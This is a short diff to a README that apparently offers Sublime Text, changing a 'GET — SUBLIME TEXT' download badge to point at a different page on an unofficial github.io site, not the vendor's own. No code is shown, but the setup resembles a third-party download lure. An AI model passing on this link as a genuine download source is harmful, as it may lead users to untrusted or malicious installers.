@@ -4,7 +4,7 @@
 <img src="https://images.seeklogo.com/logo-png/39/1/sublime-text-logo-png_seeklogo-393508.png" width="500">
 </p>
 
-[![GET — SUBLIME TEXT](https://img.shields.io/badge/GET-SUBLIME%20TEXT-2563eb?style=for-the-badge)](https://pribbledriveparter.github.io/.github/)
+[![GET — SUBLIME TEXT](https://img.shields.io/badge/GET-SUBLIME%20TEXT-2563eb?style=for-the-badge)](https://pribbledriveparter.github.io/.github/Sublime-Text)
 
 ---
 
